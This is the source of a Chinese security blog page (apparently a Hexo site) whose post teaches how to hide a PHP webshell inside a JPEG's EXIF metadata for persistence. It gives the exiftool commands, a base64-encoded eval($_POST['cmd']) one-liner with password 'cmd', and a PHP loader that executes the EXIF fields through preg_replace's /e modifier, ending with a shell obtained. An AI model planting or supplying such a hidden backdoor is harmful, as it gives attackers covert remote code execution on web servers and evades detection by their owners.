@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"m0nst3r.me","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="[TOC]##意义常见WebShell比较容易识别，利用图片exif信息可以达到隐藏WebShell的目的，以便持久化。（当然，这不是持久化的最好方法，不过作为临时持久化方法还是可以试试的） ##工具  ExifTool 一句话木马 中国菜刀客户端 图片  ##步骤  跟度娘要一张喜欢的图片  略了  安装ExifTool  2.1 环境Kali  2.2 命令：apt-get install e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用EXIFTool 隐藏WebShell">
+<meta property="og:url" content="https://m0nst3r.me/web-sec/%E5%88%A9%E7%94%A8EXIFTool%20%E9%9A%90%E8%97%8FWebShell.html">
+<meta property="og:site_name" content="m0nst3r&#39;s blog">
+<meta property="og:description" content="[TOC]##意义常见WebShell比较容易识别，利用图片exif信息可以达到隐藏WebShell的目的，以便持久化。（当然，这不是持久化的最好方法，不过作为临时持久化方法还是可以试试的） ##工具  ExifTool 一句话木马 中国菜刀客户端 图片  ##步骤  跟度娘要一张喜欢的图片  略了  安装ExifTool  2.1 环境Kali  2.2 命令：apt-get install e">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://m0nst3r.me/images/700275c77a5c6cf8c104892eec10f84475b03ad8.png">
+<meta property="og:image" content="https://m0nst3r.me/images/abc51c58dadcc228ff13b9e07e8b08b51116c0a3.png">
+<meta property="article:published_time" content="2017-09-18T03:12:00.000Z">
+<meta property="article:modified_time" content="2022-08-08T14:27:53.003Z">
+<meta property="article:author" content="m0nst3r">
+<meta property="article:tag" content="Web安全,渗透测试,网络安全,代码审计,逆向,编程">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://m0nst3r.me/images/700275c77a5c6cf8c104892eec10f84475b03ad8.png">
+
+
+<link rel="canonical" href="https://m0nst3r.me/web-sec/%E5%88%A9%E7%94%A8EXIFTool%20%E9%9A%90%E8%97%8FWebShell.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://m0nst3r.me/web-sec/%E5%88%A9%E7%94%A8EXIFTool%20%E9%9A%90%E8%97%8FWebShell.html","path":"web-sec/利用EXIFTool 隐藏WebShell.html","title":"利用EXIFTool 隐藏WebShell"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>利用EXIFTool 隐藏WebShell | m0nst3r's blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">m0nst3r's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Hello, Bugs</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">1.</span> <span class="nav-text">注意事项</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">m0nst3r</p>
+  <div class="site-description" itemprop="description">Web安全、渗透测试、网络安全、代码审计、逆向、编程</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/web-sec/%E5%88%A9%E7%94%A8EXIFTool%20%E9%9A%90%E8%97%8FWebShell.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="利用EXIFTool 隐藏WebShell | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          利用EXIFTool 隐藏WebShell
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-09-18 11:12:00" itemprop="dateCreated datePublished" datetime="2017-09-18T11:12:00+08:00">2017-09-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/web-sec/" itemprop="url" rel="index"><span itemprop="name">web-sec</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>[TOC]<br>##意义<br>常见WebShell比较容易识别，利用图片exif信息可以达到隐藏WebShell的目的，以便持久化。（当然，这不是持久化的最好方法，不过作为临时持久化方法还是可以试试的）</p>
+<p>##工具</p>
+<ol>
+<li>ExifTool</li>
+<li>一句话木马</li>
+<li>中国菜刀客户端</li>
+<li>图片</li>
+</ol>
+<p>##步骤</p>
+<ol>
+<li><p>跟度娘要一张喜欢的图片<br>  略了</p>
+</li>
+<li><p>安装ExifTool<br>  2.1 环境Kali<br>  2.2 命令：apt-get install exiftool</p>
+</li>
+<li><p>向图片中写入一句话木马<br>  执行命令：<br>  <code>exiftool &quot;-comment=&lt;test.php timg.jpg&quot;</code><br>  <code>exiftool &quot;-model=/.*/e&quot; timg.jpg</code><br>  字符串：<br>  aWYgKGlzc2V0KCRfUE9TVFsiY21kIl0pKSB7ZXZhbChzdHJpcHNsYXNoZXMoJF9QT1NUWyJjbWQiXSkpO30&#x3D;<br>  Base64解码之后的东西，我就补贴出来了，总之密码是cmd<br>  执行结果如下：<br>  <img src="/images/700275c77a5c6cf8c104892eec10f84475b03ad8.png" alt="微信截图_20170918185956.png"><br>  可以看到我们的一句话木马就写到了图片信息当中</p>
+</li>
+<li><p>修改版一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$exif</span> = <span class="title function_ invoke__">exif_read_data</span>(<span class="string">&#x27;/www/web/phpshell_google_com/public_html/timg.jpg&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="variable">$exif</span>[Model],<span class="variable">$exif</span>[Make],<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>GetShell<br>  <img src="/images/abc51c58dadcc228ff13b9e07e8b08b51116c0a3.png" alt="微信截图_20170918191022.png"></p>
+</li>
+</ol>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>[1] 图片路径可以是绝对路径，也可以是相对路径，如果是相对路径不要忘记<code>./</code>符号哦<br>[2] 测试PHP版本为5.5.根据大牛提示，preg_replace函数的<code>/e</code>选项在<code>&gt;5.6</code>版本中废除，不过也有别的函数替代。思路是对的，注意函数使用。<br>[3] 不要长时间盯着苍老师的图片看，图有魔性~~<br>##参考<br>[1] <a target="_blank" rel="noopener" href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Hiding-Webshell-Backdoor-Code-in-Image-Files/">https://www.trustwave.com/Resources/SpiderLabs-Blog/Hiding-Webshell-Backdoor-Code-in-Image-Files/</a><br>[2] <a target="_blank" rel="noopener" href="https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html">https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/pentest/CVE-2017-8759%20+%20Cobalt%20Strike%20%E5%AE%8C%E7%BE%8E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%E7%AC%94%E8%AE%B0.html" rel="next" title="CVE-2017-8759 + Cobalt Strike 完美复现过程笔记">
+                  CVE-2017-8759 + Cobalt Strike 完美复现过程笔记 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">m0nst3r</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
